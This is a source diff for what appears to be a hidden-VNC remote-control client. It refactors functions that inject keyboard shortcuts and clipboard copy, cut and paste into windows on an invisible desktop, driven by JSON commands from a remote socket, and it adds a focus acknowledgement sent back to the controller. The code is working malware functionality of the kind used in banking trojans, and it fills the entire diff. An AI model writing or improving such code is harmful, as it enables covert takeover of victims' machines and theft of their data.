@@ -966,6 +966,35 @@ static wstring GetClipboardText() {
     return res;
 }
 
+static void SendShortcut(HWND hTarget, WPARAM vk, UINT msg = 0) {
+    if (!hTarget || !IsWindow(hTarget)) return;
+
+    DWORD targetThreadId = GetWindowThreadProcessId(hTarget, NULL);
+    DWORD currentThreadId = GetCurrentThreadId();
+
+    AttachThreadInput(currentThreadId, targetThreadId, TRUE);
+
+    BYTE keyState[256];
+    GetKeyboardState(keyState);
+    BYTE oldCtrl = keyState[VK_CONTROL];
+    keyState[VK_CONTROL] = 0x80;
+    SetKeyboardState(keyState);
+
+    if (msg != 0) {
+        SendMessageTimeoutW(hTarget, msg, 0, 0, SMTO_ABORTIFHUNG, 500, NULL);
+    }
+
+    SendMessageTimeoutW(hTarget, WM_KEYDOWN, VK_CONTROL, key_lparam(VK_CONTROL, false), SMTO_ABORTIFHUNG, 500, NULL);
+    SendMessageTimeoutW(hTarget, WM_KEYDOWN, vk, key_lparam(vk, false), SMTO_ABORTIFHUNG, 500, NULL);
+    SendMessageTimeoutW(hTarget, WM_KEYUP, vk, key_lparam(vk, true), SMTO_ABORTIFHUNG, 500, NULL);
+    SendMessageTimeoutW(hTarget, WM_KEYUP, VK_CONTROL, key_lparam(VK_CONTROL, true), SMTO_ABORTIFHUNG, 500, NULL);
+
+    keyState[VK_CONTROL] = oldCtrl;
+    SetKeyboardState(keyState);
+
+    AttachThreadInput(currentThreadId, targetThreadId, FALSE);
+}
+
 // -----------------------------------------------------------------------
 static HWND GetFocusedWindow() {
     HWND hTarget = g_hCurrentFocus;
@@ -1030,41 +1059,15 @@ static void input_loop() {
             } else if (action == "hvnc_char") {
                 PostMessageW(hTarget, WM_CHAR, (WPARAM)vk, 1);
             } else if (action == "hvnc_selectall") {
-                BYTE keyState[256];
-                GetKeyboardState(keyState);
-                BYTE oldCtrl = keyState[VK_CONTROL];
-                keyState[VK_CONTROL] = 0x80;
-                SetKeyboardState(keyState);
-
-                SendMessageW(hTarget, EM_SETSEL, 0, -1);
-                SendMessageW(hTarget, WM_COMMAND, 0xE122, 0);
-                SendMessageW(hTarget, WM_KEYDOWN, VK_CONTROL, key_lparam(VK_CONTROL, false));
-                SendMessageW(hTarget, WM_KEYDOWN, 'A', key_lparam('A', false));
-                SendMessageW(hTarget, WM_KEYUP, 'A', key_lparam('A', true));
-                SendMessageW(hTarget, WM_KEYUP, VK_CONTROL, key_lparam(VK_CONTROL, true));
-
-                keyState[VK_CONTROL] = oldCtrl;
-                SetKeyboardState(keyState);
+                SendMessageTimeoutW(hTarget, EM_SETSEL, 0, -1, SMTO_ABORTIFHUNG, 500, NULL);
+                SendShortcut(hTarget, 'A', 0xE122);
             } else if (action == "hvnc_copy" || action == "hvnc_cut") {
-                BYTE keyState[256];
-                GetKeyboardState(keyState);
-                BYTE oldCtrl = keyState[VK_CONTROL];
-                keyState[VK_CONTROL] = 0x80;
-                SetKeyboardState(keyState);
-
                 UINT msg = (action == "hvnc_copy") ? WM_COPY : WM_CUT;
                 WPARAM vk_key = (action == "hvnc_copy") ? 'C' : 'X';
-                SendMessageW(hTarget, msg, 0, 0);
-                SendMessageW(hTarget, WM_KEYDOWN, VK_CONTROL, key_lparam(VK_CONTROL, false));
-                SendMessageW(hTarget, WM_KEYDOWN, vk_key, key_lparam(vk_key, false));
-                SendMessageW(hTarget, WM_KEYUP, vk_key, key_lparam(vk_key, true));
-                SendMessageW(hTarget, WM_KEYUP, VK_CONTROL, key_lparam(VK_CONTROL, true));
-
-                keyState[VK_CONTROL] = oldCtrl;
-                SetKeyboardState(keyState);
+                SendShortcut(hTarget, vk_key, msg);
 
                 thread([]() {
-                    Sleep(400);
+                    Sleep(500);
                     HDESK hHidden = OpenDesktopW(g_desktopName.c_str(), 0, FALSE, GENERIC_ALL);
                     if (hHidden) {
                         SetThreadDesktop(hHidden);
@@ -1082,22 +1085,8 @@ static void input_loop() {
                 string text = cmd.value("text", "");
                 if (!text.empty()) {
                     SetClipboardText(utf8_to_wstring(text));
-
-                    BYTE keyState[256];
-                    GetKeyboardState(keyState);
-                    BYTE oldCtrl = keyState[VK_CONTROL];
-                    keyState[VK_CONTROL] = 0x80;
-                    SetKeyboardState(keyState);
-
-                    SendMessageW(hTarget, WM_PASTE, 0, 0);
-                    SendMessageW(hTarget, WM_KEYDOWN, VK_CONTROL, key_lparam(VK_CONTROL, false));
-                    SendMessageW(hTarget, WM_KEYDOWN, 'V', key_lparam('V', false));
-                    SendMessageW(hTarget, WM_KEYUP, 'V', key_lparam('V', true));
-                    SendMessageW(hTarget, WM_KEYUP, VK_CONTROL, key_lparam(VK_CONTROL, true));
-
-                    keyState[VK_CONTROL] = oldCtrl;
-                    SetKeyboardState(keyState);
                 }
+                SendShortcut(hTarget, 'V', WM_PASTE);
             } else if (action == "hvnc_clipboard") {
                 string text = cmd.value("text", "");
                 if (!text.empty()) {
@@ -1288,6 +1277,11 @@ static void input_loop() {
             if (!hwnd) hwnd = WindowFromPoint(screenPt);
 
             if (hwnd) {
+                json ack;
+                ack["action"] = "hvnc_focus_ack";
+                ack["hwnd"] = to_string((uintptr_t)hwnd);
+                safe_send_json(g_socket, ack);
+
                 LRESULT ht = HTCLIENT;
                 SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
                                     SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht);
